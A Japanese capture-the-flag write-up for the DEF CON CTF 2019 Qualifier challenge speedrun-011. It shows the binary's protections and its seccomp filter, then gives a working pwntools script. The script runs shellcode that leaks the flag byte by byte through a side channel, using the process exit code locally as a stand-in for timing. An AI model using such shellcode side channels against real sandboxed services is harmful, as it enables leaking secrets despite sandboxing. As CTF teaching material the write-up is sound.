# [pwn 5pts] speedrun-011 - DEF CON CTF 2019 Qualifier
64ビットで全部有効です。
```
$ checksec -f speedrun-011
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes	0		2	speedrun-011
```
シェルコード問題です。seccompが有効です。
```
$ seccomp-tools dump ./speedrun-011
Can you drive with a blindfold?
Send me your vehicle
l
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x05 0x00 0x40000000  if (A >= 0x40000000) goto 0009
 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008
 0005: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0008
 0006: 0x15 0x01 0x00 0x0000000f  if (A == rt_sigreturn) goto 0008
 0007: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```
なんかこれ見たらread, writeとかが許可されているように見えますが、実際は禁止されています。
無理では？

と、思ったのですが、最初にmallocした領域にflagを読み込んでいます。
なのでtime based attackでいけますね。
（あれ、これInterKosenCTFのsandboxと同じでは...？）
ただし、シェルコードにNULLバイトが入らないように注意しましょう。

まずはflagのアドレスを特定しなくてはいけないと思いきや、これも第一引数で渡されています。
なーんだ、思ったより簡単じゃん。

本番サーバーではこの攻撃が動くようなのですが、ローカルでは動かなかったので、ずるして終了コードを取得します。

```python
from pwn import *
import time
import subprocess

context.log_level = 'warning'

flag = ""
for i in range(1, 100):
    for c in range(ord(" "), ord("}")):
        shellcode = asm(
            """
            mov al, byte [rdi + {}]
            cmp al, {}
            jnz bye
            int3
            bye:
            ret
            """.format(i, c),
            arch='amd64'
        )
        if '\x00' in shellcode:
            print(disasm(shellcode, arch='amd64'))
        sock = process("./speedrun-011")
        sock.recvuntil("vehicle\n")
        sock.sendline(shellcode)
        while True:
            x = sock.poll()
            if x is not None:
                break
        sock.close()
        if x == -5:
            flag += chr(c)
            break
    else:
        print("...?")
        exit()
    print(flag)
```

めっちゃ時間かかるなこれ。
```
$ python solve.py 
O
O{
O{D
O{Du
O{Dum
O{Dumm
O{Dummy
```

本当は`OOO{Dummy}`にしたのですが、まぁ良いでしょう。

# 感想
もうシェルコードはいいから......ね？